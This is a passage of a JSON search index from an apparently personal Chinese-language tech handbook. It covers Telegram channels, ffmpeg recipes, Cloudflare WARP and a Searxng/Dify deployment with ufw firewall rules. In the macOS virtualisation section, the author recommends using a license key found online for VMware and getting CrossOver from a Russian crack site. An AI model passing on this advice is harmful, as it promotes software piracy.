<p>\u4e3b\u653b\u6da6\u5b66\u5206\u4eab\uff0c\u7fa4\u91cc\u5f88\u591a\u6da6\u5b66\u7406\u8bba\u5bb6\u53ef\u4ee5\u54a8\u8be2</p>"},{"location":"handbook/telegram/#sociology","title":"Sociology","text":"<ul> <li>Iyouport</li> </ul> <p>\u81ea\u7531\u6e2f\u65b0\u95fb\u5e2e\uff0c\u793e\u4f1a\u5b66\u89c2\u5bdf\u4e0e\u89e3\u6784</p> <ul> <li>TomBen\u2019s Web Excursions</li> </ul> <p>Social Science Ph.D. - \u793e\u4f1a\u77db\u76fe\u8bba\u6587\u89e3\u8bfb\uff0c\u5b9e\u9a8c\u6570\u636e\u5206\u4eab\uff0c\u5df2\u505c\u66f4</p> <ul> <li>\u5fae\u4fe1\u642c\u8fd0\u5de5 - @wxbyg</li> <li>JUST A PEEK - @justapeek</li> <li>\u4e2d\u82f1\u6587\u4ed8\u8d39\u671f\u520a\u5206\u53d1 - @Qikan2023</li> <li>\u6cd5\u62c9\u76db\u7f8e\u7c4d\u6d41\u6d6a\u6c49 - @youyaodaofanlexdm</li> </ul>"},{"location":"handbook/telegram/#entertainment","title":"Entertainment","text":"<ul> <li>\u5c0f\u7ea2\u4e66\u4e00\u77a5</li> <li>\u590d\u5236\u7c98\u8d34 - @fuzhizhantie6324</li> <li>\u6d6a\u4eba\u65b0\u95fb \u5bfc\u6f14\u526a\u8f91\u7248 - @RoninShinbun</li> </ul>"},{"location":"handbook/telegram/#ai","title":"AI","text":"<ul> <li>AI Copilot Channel</li> </ul> <ol> <li> <p>Immanuel Kant \u5bf9\u4e8e\u81ea\u7531\u7684\u5b9a\u4e49 \u21a9</p> </li> </ol>"},{"location":"tools/ffmpeg/","title":"FFMPEG","text":""},{"location":"tools/ffmpeg/#shortcuts","title":"Shortcuts","text":""},{"location":"tools/ffmpeg/#_1","title":"\u7f51\u7edc\u4e32\u6d41\u4fdd\u5b58","text":"<pre><code>ffmpeg -i \"&lt;https://somem3u8linkfromwebsite.master.m3u8&gt;\" -c:v libx264 -preset slow -crf 22 \"save.mp4\"\n</code></pre>"},{"location":"tools/ffmpeg/#_2","title":"\u89c6\u9891\u7247\u6bb5\u88c1\u526a","text":"<pre><code>ffmpeg -ss 00:00:00 -t 00:00:30 -i input.mp4 -vcodec copy -acodec copy output.mp4\n</code></pre>"},{"location":"tools/ffmpeg/#_3","title":"\u6309\u7167\u89c6\u9891\u5e8f\u53f7\u5408\u5e76","text":"<p>\u5728\u6587\u4ef6\u5939\u4e0b\u6309\u7167\u6570\u5b57\u6392\u5e8f\u6587\u4ef6\u540e\u76f4\u63a5\u5408\u5e76\uff0c\u9002\u7528\u4e8e m3u8 \u7b49\u6587\u4ef6\u88ab\u5206\u6bb5\u4fdd\u62a4\u540e\u7684\u5408\u5e76\u91cd\u7ec4</p> <pre><code>ffmpeg -safe 0 -f concat -i &lt;(find \"$PWD\" -name '*.mp4' -printf \"file '%p'\\\\\\\\n\" | sort) -c copy output.mp4\n</code></pre>"},{"location":"tools/ffmpeg/#_4","title":"\u89c6\u9891\u6279\u91cf\u8f6c\u6362\u683c\u5f0f","text":"<pre><code>for i in *.flv;\n  do name=`echo \"$i\" | cut -d'.' -f1`\n  echo \"$name\"\n  ffmpeg -i \"$i\" \"${name}.mp4\"\ndone\n</code></pre>"},{"location":"tools/ffmpeg/#mp4","title":"\u97f3\u9891\u5d4c\u5165 MP4 \u89c6\u9891","text":"<pre><code>ffmpeg -i input.mp4 -i input.mp3 -c copy -map 0:v:0 -map 1:a:0 output.mp4 \n</code></pre>"},{"location":"tools/ffmpeg/#mp4-srt","title":"MP4 \u5e95\u90e8\u5d4c\u5165 SRT \u5b57\u5e55","text":"<pre><code>ffmpeg -i input.mp4 -vf subtitles=subtitles.srt output.mp4\n</code></pre>"},{"location":"tools/ffmpeg/#_5","title":"\u6709\u635f\u538b\u7f29","text":"<pre><code>ffmpeg -i input.mp4 -c:v libx264 -tag:v avc1 -movflags faststart -crf 30 -preset superfast output.mp4\n</code></pre> <p><code>-c:v libx264</code> \u4e3b\u6d41\u3001\u9ad8\u6548\u7684 H.264 \u538b\u7f29\u7f16\u7801\u3002</p> <p><code>-movflags faststart</code> \u5143\u6570\u636e\u524d\u7f6e\uff0c\u89c6\u9891\u8fd8\u672a\u5b8c\u5168\u4e0b\u8f7d\u65f6\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u64ad\u653e\u3002</p> <p><code>-crf 30</code> \u52a8\u6001\u7801\u5f8b\uff0c\u5927\u5e45\u538b\u7f29\u7684\u5173\u952e\u3002</p> <p><code>-preset superfast</code> \u63d0\u5347\u538b\u7f29\u901f\u5ea6\u3002</p>"},{"location":"tools/ffmpeg/#automater","title":"Automater","text":"<p>\u5efa\u7acb\u4f18\u5316\u5de5\u4f5c\u6d41\uff0c\u591a\u6587\u4ef6\u9009\u4e2d\u5373\u53ef\u538b\u7f29\uff0c\u8be5\u65b9\u6848\u53ef\u7528\u4e8e\u6240\u6709\u811a\u672c:</p> <pre><code>#!/bin/zsh\nfor f in \"$@\"\ndo\n  /opt/homebrew/bin/ffmpeg -i \"$f\" -c:v libx264 -crf 30 -r 24 -movflags faststart -c:a aac -b:a 128k -preset superfast \"${f%.*}_compressed.mp4\"\ndone\n</code></pre>"},{"location":"tools/ffmpeg/#macos-m","title":"MacOS M \u7cfb\u5217\u82af\u7247\u63a8\u7406\u52a0\u901f","text":"<ul> <li>H.264</li> </ul> <pre><code>-c:v h264_videotoolbox\n</code></pre> <ul> <li>HEVC/H.265 </li> </ul> <pre><code>-c:v hevc_videotoolbox\n</code></pre> <pre><code>ffmpeg -i input.mov -c:v h264_videotoolbox output.mp4\n</code></pre> <p>\u5173\u4e8e\u5176\u89e3\u7801\u5668\u5176\u4ed6\u9009\u9879\uff1a</p> <pre><code>ffmpeg -h encoder=h264_videotoolbox \nffmpeg -h encoder=hevc_videotoolbox\n</code></pre> <p>\u7f3a\u70b9\u4e3a\u8be5\u7c7b\u89e3\u7801\u5668\u5e76\u4e0d\u652f\u6301 crf \u9009\u9879\uff0c\u53ea\u80fd\u4f7f\u7528 <code>-b:v</code> \u53bb\u8bbe\u7f6e\u7801\u7387\uff1a<code>-b:v 6000k.</code></p>"},{"location":"tools/gfw/","title":"The Great Firewall","text":""},{"location":"tools/gfw/#cloudflare-warp","title":"Cloudflare WARP<sup>1</sup>","text":"<p><code>wgcf.exe</code> \u4e0b\u8f7d\u5b89\u88c5\uff1awgcf</p> <pre><code>.\\wgcf.exe register\n.\\wgcf.exe generate\n</code></pre> <p>\u6700\u540e\u628a\u6240\u6709\u4ee3\u7406\u670d\u52a1\u5668\u5173\u95ed\uff0c\u8fdb\u884c IP \u6d4b\u901f\u8c03\u4f18</p> <p>CloudflareWarpSpeedTest</p> <p>\u6267\u884c\u76f8\u5173\u811a\u672c\u67e5\u770b\u751f\u6210\u7684\u6570\u636e\uff0c\u66ff\u6362 Endpoint \u5173\u952e\u8bcd</p> <pre><code>qrencode -t ansiutf8 &lt; wgcf-profile.conf\n</code></pre> <ol> <li> <p>\u5728 WireGuard \u5ba2\u6237\u7aef\u4e0a\u4f7f\u7528 CloudFlare WARP \u8282\u70b9 \u21a9</p> </li> </ol>"},{"location":"tools/searxng/","title":"Dify + Searxng Plugin","text":"<p>Dify \u4e0a\u914d\u5408 Searxng + Webscraper \u53ef\u5feb\u901f\u5b9e\u73b0\u96f6\u6210\u672c\u81ea\u5efa\u5e76\u4e14\u65e0\u901f\u7387\u9650\u5236\u7684\u77e5\u8bc6\u641c\u7d22\u5668\u3002</p>"},{"location":"tools/searxng/#quick-start","title":"Quick Start","text":"<ul> <li>\u670d\u52a1\u5668\u642d\u5efa Dify \u540e\u4f7f\u7528 Zerotier \u8fde\u63a5\u5176\u5c40\u57df\u7f51\u5728 Mac \u4e0a\u8fdb\u884c\u8bbf\u95ee</li> <li>Docker \u642d\u5efa Searxng \u670d\u52a1\u7aef\u540e\u5728 Dify \u5b89\u88c5\u5176 Plugin \u5e76\u914d\u7f6e</li> <li>\u7f51\u7edc\u914d\u7f6e\u4fee\u6539\u5b9e\u73b0 <code>ufw</code> \u7ba1\u63a7 Docker \u7aef\u53e3\u9632\u706b\u5899\u80fd\u529b</li> </ul>"},{"location":"tools/searxng/#docker-firewall","title":"Docker Firewall<sup>1</sup>","text":"<pre><code>nano /etc/ufw/after.rules\n</code></pre> <pre><code># BEGIN UFW AND DOCKER\n*filter\n:ufw-user-forward - [0:0]\n:DOCKER-USER - [0:0]\n-A DOCKER-USER -j RETURN -s 10.0.0.0/8\n-A DOCKER-USER -j RETURN -s 172.16.0.0/12\n-A DOCKER-USER -j RETURN -s 192.168.0.0/16\n\n-A DOCKER-USER -j ufw-user-forward\n\n-A DOCKER-USER -j DROP -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -d 192.168.0.0/16\n-A DOCKER-USER -j DROP -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -d 10.0.0.0/8\n-A DOCKER-USER -j DROP -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -d 172.16.0.0/12\n-A DOCKER-USER -j DROP -p udp -m udp --dport 0:32767 -d 192.168.0.0/16\n-A DOCKER-USER -j DROP -p udp -m udp --dport 0:32767 -d 10.0.0.0/8\n-A DOCKER-USER -j DROP -p udp -m udp --dport 0:32767 -d 172.16.0.0/12\n\n-A DOCKER-USER -j RETURN\nCOMMIT\n# END UFW AND DOCKER\n</code></pre> <pre><code>sudo systemctl restart ufw\n</code></pre>"},{"location":"tools/searxng/#searxng-setting","title":"Searxng Setting","text":"<pre><code>nano \"${PWD}/searxng/settings.yml\"\n</code></pre> <p>\u8bb0\u4e0b\u670d\u52a1\u5668\u5728 ZeroTier \u5c40\u57df\u7f51\u4e2d\u7684 IP \u5730\u5740\uff0c\u6211\u7684\u4e3a <code>192.168.191.170</code>\uff0c\u56e0\u6b64\u4e3a\u4e86\u5b9e\u73b0\u53ea\u6709\u5c40\u57df\u7f51\u4e2d\u8bbe\u5907\u53ef\u8fde\u63a5\u6b64\u670d\u52a1\uff1a</p> <pre><code>formats:\n  - html\n  - json\n</code></pre> <p>\u9996\u5148\u786e\u4fdd\u914d\u7f6e\u4e2d\u542b\u6709 <code>json</code> \u8bbe\u7f6e\uff0c\u63a5\u7740\u5728 <code>server</code> \u914d\u7f6e\u9009\u9879\u4e2d\u4e3a\u9632\u6b62\u88ab\u6df7\u6dc6\uff0c\u4e25\u683c\u6539\u4e3a ZeroTier \u5730\u5740</p> <pre><code>server:\n  port: 8081\n  bind_address: \"192.168.191.170\"\n  base_url: http://192.168.191.170:8081/\n  limiter: false\n  public_instance: false\n</code></pre> <p>\u4e0b\u9762\u4f1a\u6709\u4e00\u4e2a <code>secret_key</code> \u4e0d\u8981\u52a8</p>"},{"location":"tools/searxng/#run","title":"Run","text":"<pre><code>ufw allow 8081\nufw reload\n</code></pre> <pre><code>docker run \\\n  -d -p 8081:8080 \\\n  -v \"${PWD}/searxng:/etc/searxng\" \\\n  -e \"BASE_URL=http://192.168.191.170:8081/\" \\\n  -e \"INSTANCE_NAME=searxng\" \\\n  --restart always \\\n  searxng/searxng\n</code></pre> <p>\u7ed3\u675f\u540e\u8fde\u4e0a ZeroTier \u670d\u52a1\u540e\u5982\u80fd\u6b63\u5e38\u6253\u5f00\u76f4\u63a5\u524d\u5f80 Dify \u5b89\u88c5\u63d2\u4ef6\u586b\u5199 <code>BASE_URL</code> \u5373\u53ef\uff0c\u7ed3\u675f\u5b89\u88c5</p>"},{"location":"tools/searxng/#common-mistakes","title":"Common Mistakes","text":"<pre><code>tail -f /var/log/ufw.log\nufw status numbered\nsudo ufw allow from 172.19.0.7 to 192.168.191.170 port 8081\nufw delete num\n</code></pre> <p>\u524d\u671f\u6709\u79cd\u60f3\u6cd5\uff1a\u901a\u8fc7 <code>ufw</code> \u6765\u7cbe\u786e\u63a7\u5236\u8bbf\u95ee\uff0c\u4f46\u662f\u5176\u4f1a\u76f4\u63a5\u5bfc\u81f4 Dify \u4e2d\u5927\u6a21\u578b\u4f7f\u7528\u8d85\u65f6\uff0c\u56e0\u6b64\u5408\u7406\u505a\u6cd5\u4e3a\u5728\u914d\u7f6e\u4e2d\u5b9a\u4e49\u7cbe\u786e</p> <ol> <li> <p>What is the best practice of docker + ufw under Ubuntu  \u21a9</p> </li> </ol>"},{"location":"tools/wine/","title":"macOS Virtual Machine","text":"<p>\u5b59\u609f\u7a7a\uff0c\u65e9\u5c31\u6b7b\u4e86\uff01\u516b\u6212\uff0c\u4f60\u5fc3\u91cc\u660e\u767d\uff0c\u4f60\u90a3\u5e08\u5144\uff0c\u4ece\u6765\u6ca1\u90a3\u4e48\u5706\u6ee1\u3002</p>"},{"location":"tools/wine/#_1","title":"\u6267\u5ff5","text":"<p>\u4e0a\u5b66\u671f\u4fee\u4e86\u4e00\u95e8 Cybersecurity, \u7528\u5230\u4e86 UTM \u8fd0\u884c Kali Linux \u865a\u62df\u673a\uff0c\u56e0\u6b64\u89e6\u53d1\u4e86\u4e00\u4e9b\u88ab\u521b\u9020\u7684\u9700\u6c42\uff0c\u4e5f\u662f\u6267\u5ff5\u7684\u5f00\u59cb\u3002</p>"},{"location":"tools/wine/#vmware-fusion","title":"VMware Fusion","text":"<p>\u5176\u4f18\u70b9\u4e3a\u53ef\u4ee5\u5728\u7f51\u4e0a\u968f\u610f\u627e\u4e00\u4e2a Key \u7c98\u8d34\uff0c\u7136\u540e\u6b63\u7248\u4e1d\u6ed1\u66f4\u65b0\u6b63\u5e38\u4f7f\u7528\u3002\u7f3a\u70b9\u4e3a\u65e0\u6cd5\u50cf UTM \u4e00\u6837\u76f4\u63a5\u8fd0\u884c x86 \u7cfb\u7edf\uff0c\u9700\u8981\u4e13\u95e8\u5bfb\u627e ARM \u7248\u672c\u4e0b\u8f7d\u8fd0\u884c\u3002\u4f46 Windows 11 ARM \u7248\u5185\u7f6e ARM to x86 \u6307\u4ee4\u96c6\u8f6c\u8bd1\uff0c\u53ef\u4ee5\u4e1d\u6ed1\u8fd0\u884c\u6240\u6709\u865a\u62df\u673a\u91cc\u7684 x86 \u5e94\u7528\uff0c\u5927\u7ea6\u4f1a\u5360\u7528\u63a5\u8fd1 40 G \u7a7a\u95f4\uff0c\u53ef\u4ee5\u6d41\u7545\u8fd0\u884c\u690d\u7269\u5927\u6218\u50f5\u5c38\u6742\u4ea4\u7248\u548c\u5176\u4fee\u6539\u5668\u3002</p> <p>\u6b64\u65b9\u6848\u5728\u517c\u5bb9\u6027\u65b9\u9762\u6700\u4f73\uff0c\u4f46\u9700\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u767b\u9646\u5fae\u8f6f\u8d26\u6237\uff0c\u6fc0\u6d3b\u7cfb\u7edf\u4f18\u5316\u8bbe\u7f6e\uff0c\u5e76\u9650\u5b9a\u865a\u62df\u673a\u914d\u7f6e\u5360\u7528\u5904\u7406\u5668\u548c\u5185\u5b58\u7b49\uff0c\u53ea\u9002\u5408\u4e00\u4e9b\u6027\u80fd\u5360\u7528\u8f83\u4f4e\u7684\u6e38\u620f\u548c\u8f6f\u4ef6\u8fd0\u884c\u3002\u5e76\u4e14\u6587\u4ef6\u914d\u7f6e\u4e00\u65e6\u9700\u8981\u66f4\u6539\uff0c\u4ece\u5916\u90e8\u62d6\u52a8\u8f83\u4e3a\u9ebb\u70e6\uff0c\u800c\u672c\u8eab\u65e5\u5e38\u5b66\u4e60\u6ca1\u6709 Windows \u7cfb\u7edf\u4f7f\u7528\u573a\u666f\uff0c\u800c\u5bb6\u4e2d\u6709\u4e00\u4e2a Ubuntu \u7cfb\u7edf\u7684\u5fae\u7535\u8111\u53ef\u4ee5\u6ee1\u8db3\u8ba1\u7b97\u673a\u8bfe\u7a0b\u9700\u8981\uff0c\u56e0\u6b64\u5220\u9664\u3002</p>"},{"location":"tools/wine/#crossover","title":"CrossOver","text":"<p>\u4ece Wine + Wineskin \u4ee5\u53ca\u514d\u8d39\u7684 Whisky \u5168\u90e8\u5c1d\u8bd5\u4e00\u904d\u540e\uff0c\u53d1\u73b0 CrossOver \u8fd9\u6837\u7684\u5546\u4e1a\u8f6f\u4ef6\u624d\u662f\u5bb9\u5668\u9886\u57df\u7684\u6700\u4f73\u89e3\u51b3\u65b9\u6848\uff0cWhisky \u7684 Wine \u7248\u672c\u8fc7\u4f4e\u5e76\u4e14\u6ca1\u6709\u90e8\u5206\u517c\u5bb9\u9009\u9879\uff0cCrossOver \u4e0d\u4ec5\u4f1a\u4e0d\u65ad\u4fee\u590d\u4e3b\u6d41\u8f6f\u4ef6\u8fd0\u884c Bug \u8fd8\u4f1a\u4fdd\u6301\u5bb9\u5668\u6700\u65b0\u7248\u672c\u3002\u642d\u914d Game Porting Toolkit 2 \u80fd\u6b63\u5e38 Steam \u73a9\u6e38\u620f\u4ee5\u53ca\u8fd0\u884c\u90e8\u5206 3D \u79bb\u7ebf\u8f6f\u4ef6\uff0c\u514d\u9664\u7e41\u7410\u7684\u914d\u7f6e\u6307\u4ee4\u5e76\u4e14\u63d0\u4f9b\u9000\u51fa\u91cd\u542f\u7b49\u5feb\u6377\u6309\u94ae\u3002</p>"},{"location":"tools/wine/#install","title":"Install","text":"<p>\u4ece\u4fc4\u7f57\u65af\u7834\u89e3\u7f51\u7ad9\u4e0b\u8f7d\u5b89\u88c5\u6700\u65b0 CrossOver \u5b89\u88c5\u597d\u540e\u65b0\u5efa Win10 64-bi t Bottle \u5e76\u5f00\u542f D3DMetal \u548c MSync \u9009\u9879:</p> <p>D3DMetal \u662f\u4e00\u4e2a\u56fe\u5f62 API \u7ffb\u8bd1\u5c42\uff0c\u4e3b\u8981\u7528\u4e8e\u5c06 DirectX 11 \u548c DirectX 12 \u6e38\u620f\u79fb\u690d\u5230 MacOS \u7cfb\u7edf\u4e0a \u3002\u5f53\u542f\u7528 D3DMetal \u65f6\uff0c\u5b83\u4f1a\u66ff\u4ee3 DXVK \u6216 Wined3d \u9ed8\u8ba4\u8bbe\u7f6e\uff0c\u4ece\u800c\u63d0\u4f9b\u66f4\u597d\u7684\u6e38\u620f\u6027\u80fd\u3002</p> <p>ESync\uff0c\u5373\u4e8b\u4ef6\u540c\u6b65\uff08event synchronization\uff09\uff0c\u662f\u4e00\u4e2a\u7531 Wine \u63d0\u51fa\u7684\u8865\u4e01\u96c6\uff0c\u65e8\u5728\u6539\u5584 Windows \u5e94\u7528\u7a0b\u5e8f\u4e0e\u5e95\u5c42\u64cd\u4f5c\u7cfb\u7edf\u4e4b\u95f4\u4e8b\u4ef6\u7684\u540c\u6b65\u3002\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u5f00\u542f ESync \u540e\u6027\u80fd\u4f1a\u663e\u8457\u63d0\u5347 \u3002\u8fd9\u4e2a\u673a\u5236\u5728\u5904\u7406\u591a\u7ebf\u7a0b\u5e94\u7528\u65f6\u5c24\u4e3a\u91cd\u8981\uff0c\u53ef\u4ee5\u51cf\u5c11\u56e0\u7ebf\u7a0b\u8c03\u5ea6\u4e0d\u5f53\u5bfc\u81f4\u7684\u6027\u80fd\u635f\u5931\u2074\u3002</p> <p>MSYNC \u65e8\u5728\u8fdb\u4e00\u6b65\u63d0\u9ad8\u5728\u975e Windows \u7cfb\u7edf\u4e2d\u8fd0\u884c\u7684 Windows \u5e94\u7528\u7a0b\u5e8f\u7684\u6027\u80fd\u548c\u540c\u6b65\u3002\u4e0e ESync \u4e0d\u540c\u7684\u662f\uff0cMSYNC \u4e13\u6ce8\u4e8e\u6539\u8fdb\u591a\u4e2a\u7ebf\u7a0b\u95f4\u7684\u534f\u4f5c\uff0c\u80fd\u591f\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u663e\u8457\u63d0\u5347\u6e38\u620f\u4f53\u9a8c\u3002MSYNC \u5df2\u7ecf\u5f00\u59cb\u5f97\u5230\u652f\u6301\uff0c\u4f7f\u5f97 Mac \u7528\u6237\u4e5f\u80fd\u4eab\u53d7\u5230\u66f4\u7a33\u5b9a\u7684\u6027\u80fd\u6539\u5584\u3002</p> <p>\u5b9e\u6d4b\u540e\u53d1\u73b0 ESync \u5f00\u542f\u540e\u5b9e\u9645\u4f1a\u62d6\u6162 3D \u6e38\u620f\u8fd0\u884c\u901f\u5ea6\uff0c\u63a8\u8350\u6e38\u620f\u53ea\u5f00\u542f D3D + MSYNC \u9009\u9879</p> <p>\u90e8\u5206\u5e94\u7528\u4e2d\u6587\u5b89\u88c5\u542f\u52a8\u8fc7\u7a0b\u6587\u5b57\u4f1a\u4e71\u7801\uff0c\u70b9\u51fb Run With Options \u5728 Command-Line Options \u4e2d\u8bbe\u7f6e\u4ee5\u4e0b\u73af\u5883\u6307\u4ee4\u540e\u518d\u542f\u52a8\uff1a</p> <pre><code>set lang=zh_cn\n</code></pre>"},{"location":"tools/wine/#gtk-2","title":"GTK 2","text":"<p>\u7b80\u4ecb\u91cc\u5df2\u63d0\u4f9b\u4e86\u4e0b\u8f7d\u94fe\u63a5\uff0c\u5b9e\u6d4b\u9700\u4f7f\u7528 Safari \u624d\u80fd\u6b63\u5e38\u4e0b\u8f7d\uff0c\u6302\u8f7d\u540e\u4f1a\u770b\u5230 <code>Evaluation environment for Windows games 2.0.dmg</code> \u6587\u4ef6\uff0c\u6253\u5f00\u540e\u540c\u610f\u542f\u52a8\u4f1a\u81ea\u52a8\u6ce8\u5165\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\uff0c\u540c\u610f\u6253\u5f00\u540e\u4f1a\u770b\u5230\u4e00\u4e2a <code>Read Me.rtf</code> \u6587\u4ef6\uff0c\u6253\u5f00\u540e\u590d\u5236 CrossOver \u6807\u9898\u4e0b\u7684\u6307\u4ee4\u5728 Terminal \u4e2d\u7c98\u8d34\u4e00\u4ef6\u66ff\u6362 CrossOver \u4e2d\u7684\u517c\u5bb9\u5c42:</p> <pre><code>cd /Applications/CrossOver.app/Contents/SharedSupport/CrossOver/lib64/apple_gptk/external\nmv D3DMetal.framework D3DMetal.framework-old; mv libd3dshared.dylib libd3dshared.dylib-old\nditto /Volumes/Evaluation\\ environment\\ for\\ Windows\\ games\\ 2.0/redist/lib/external/ .\n</code></pre>"},{"location":"tools/wine/#others","title":"Others","text":"<p>Steam \u89d2\u6807\u5728\u5f3a\u5236\u9000\u51fa\u4e4b\u540e\u4f9d\u7136\u4f1a\u5728\u53f3\u4e0a\u89d2\u6b8b\u7559\uff0c\u56e0\u6b64\u6700\u597d\u624b\u52a8\u91cd\u542f\u5bb9\u5668\uff0c\u5c11\u6570\u60c5\u51b5\u4e0b\u4f7f\u7528\u5de6\u4e0a\u89d2\u82f9\u679c\u56fe\u6807\u5f3a\u5236\u9000\u51fa\u6216\u6267\u884c\uff1a</p> <pre><code>pkill -f wine\n</code></pre> <p>Steam \u6e38\u620f\u4e0b\u8f7d\u5b8c\u6bd5\u540e\u5c06 steamapps/common \u6587\u4ef6\u5939\u76f8\u5173\u6587\u4ef6\u4f5c\u786c\u76d8\u5907\u4efd</p>"}]}